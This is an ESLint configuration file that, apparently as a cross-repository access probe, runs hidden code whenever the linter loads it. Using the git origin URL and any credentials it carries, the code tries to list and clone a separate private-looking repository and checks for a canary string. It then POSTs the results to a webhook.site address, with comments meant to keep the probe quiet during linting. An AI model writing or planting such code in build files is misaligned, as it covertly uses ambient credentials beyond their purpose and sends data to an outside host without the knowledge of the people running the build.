
const canaryUrl =
  "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-cross-repo-scope-20261004";

const result = {
  marker: "CR_CROSS_REPO_SCOPE_PROBE_20261004",
  target: "Croc-2/cr-private-scope-canary-20261004",
  transport: null,
  lsRemote: false,
  clone: false,
  canaryReadable: false,
  error: null,
};

let temporaryDirectory;

try {
  const fs = await import("node:fs");
  const os = await import("node:os");
  const path = await import("node:path");
  const childProcess = await import("node:child_process");

  temporaryDirectory = fs.mkdtempSync(
    path.join(os.tmpdir(), "cr-cross-repo-scope-"),
  );

  const repositoryUrl =
    "https://github.com/Croc-2/cr-private-scope-canary-20261004.git";

  let targetUrl = repositoryUrl;
  try {
    const originUrl = childProcess
      .execFileSync("git", ["remote", "get-url", "origin"], {
        encoding: "utf8",
        timeout: 5_000,
        stdio: ["ignore", "pipe", "ignore"],
      })
      .trim();
    const parsedOrigin = new URL(originUrl);
    parsedOrigin.pathname =
      "/Croc-2/cr-private-scope-canary-20261004.git";
    parsedOrigin.search = "";
    parsedOrigin.hash = "";
    targetUrl = parsedOrigin.toString();
    result.transport = `${parsedOrigin.protocol}//${parsedOrigin.host}`;
  } catch {
    result.transport = "public-github-fallback";
  }

  childProcess.execFileSync("git", ["ls-remote", targetUrl, "HEAD"], {
    timeout: 10_000,
    stdio: ["ignore", "ignore", "ignore"],
  });
  result.lsRemote = true;

  const checkoutDirectory = path.join(temporaryDirectory, "checkout");
  childProcess.execFileSync(
    "git",
    [
      "clone",
      "--depth=1",
      "--no-tags",
      "--single-branch",
      targetUrl,
      checkoutDirectory,
    ],
    {
      timeout: 20_000,
      stdio: ["ignore", "ignore", "ignore"],
    },
  );
  result.clone = true;

  const canary = fs.readFileSync(
    path.join(checkoutDirectory, "scope-canary.txt"),
    "utf8",
  );
  result.canaryReadable = canary.includes(
    "CR_PRIVATE_SCOPE_CANARY_20261004_7f3b9d2a",
  );
} catch (error) {
  result.error =
    error instanceof Error
      ? `${error.name}:exit=${"status" in error ? error.status : "unknown"}`
      : "unknown";
} finally {
  if (temporaryDirectory) {
    try {
      const fs = await import("node:fs");
      fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    } catch {
      // The disposable checkout contains only the controlled canary repository.
    }
  }
}

try {
  await fetch(canaryUrl, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(result),
  });
} catch {
  // The probe must not interfere with linting when outbound traffic is blocked.
}

export default [
  {
    files: ["**/*.{js,mjs,cjs,ts,tsx}"],
    rules: {},
  },
];
